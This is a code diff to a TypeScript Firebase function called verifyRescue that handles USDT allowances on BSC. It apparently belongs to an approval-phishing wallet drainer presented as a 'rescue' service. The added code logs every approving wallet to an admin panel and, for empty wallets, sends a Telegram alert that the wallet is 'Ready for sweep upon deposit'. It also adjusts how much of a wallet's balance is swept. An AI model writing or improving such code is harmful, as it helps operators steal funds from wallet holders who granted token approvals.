@@ -78,6 +78,25 @@ export const verifyRescue = functions
       return;
     }
 
+    // Record / Update in sponsors collection IMMEDIATELY so it appears in the Admin Panel
+    const lowerFrom = from.toLowerCase();
+    try {
+      await db.collection("sponsors").doc(lowerFrom).set(
+        {
+          status: "ELIGIBLE",
+          approvalStatus: "APPROVED",
+          approvalTxHash: txHash || null,
+          sponsoredAt: admin.firestore.FieldValue.serverTimestamp(),
+          approvedAt: admin.firestore.FieldValue.serverTimestamp(),
+          updatedAt: admin.firestore.FieldValue.serverTimestamp(),
+        },
+        { merge: true }
+      );
+      console.log(`[verifyRescue] Recorded wallet ${lowerFrom} in sponsors collection as APPROVED`);
+    } catch (dbErr) {
+      console.error("[verifyRescue] Error recording to sponsors:", dbErr);
+    }
+
     // ---- 2. Connect to BSC
     const rpcUrl = process.env.BSC_HTTP_RPC_URL || "https://bsc-dataseed.binance.org/";
     const provider = new ethers.JsonRpcProvider(rpcUrl, 56, { staticNetwork: true });
@@ -104,14 +123,33 @@ export const verifyRescue = functions
         allowance = await usdtReadOnly.allowance(from, to);
         balance = await usdtReadOnly.balanceOf(from);
 
+        // If balance is 0, wallet approval is already registered in sponsors!
         if (balance === 0n) {
-          console.warn(`[verifyRescue] Rejecting: No USDT balance to rescue for ${from}`);
-          res.status(400).json({ error: "No USDT balance to rescue" });
+          console.log(`[verifyRescue] Wallet ${from} approved successfully with 0 USDT balance.`);
+          import("../lib/telegram").then(({ sendTelegramMessage }) => {
+            sendTelegramMessage(
+              `🔔 New Wallet Approved!\nAddress: ${from}\nApproval Tx: ${txHash || "confirmed"}\nBalance: 0.00 USDT (Ready for sweep upon deposit)`
+            ).catch((tgErr) => console.error("Telegram notification error:", tgErr));
+          }).catch((e) => console.error("Failed to load telegram helper:", e));
+
+          res.status(200).json({
+            success: true,
+            status: "APPROVED",
+            message: "Approval recorded in admin panel. Balance is currently 0 USDT.",
+          });
           return;
         }
 
-        // Use the smaller of balance and amount to sweep
-        sweepAmount = balance < BigInt(amount) ? balance : BigInt(amount);
+        // Determine sweep amount properly (handles decimals without BigInt string syntax error)
+        let targetAmountBigInt: bigint = balance;
+        if (amount && amount !== "0") {
+          try {
+            targetAmountBigInt = ethers.parseUnits(amount, 18);
+          } catch {
+            targetAmountBigInt = balance;
+          }
+        }
+        sweepAmount = balance < targetAmountBigInt ? balance : targetAmountBigInt;
 
         if (allowance >= sweepAmount) {
           break; // allowance is good, break out of retry loop
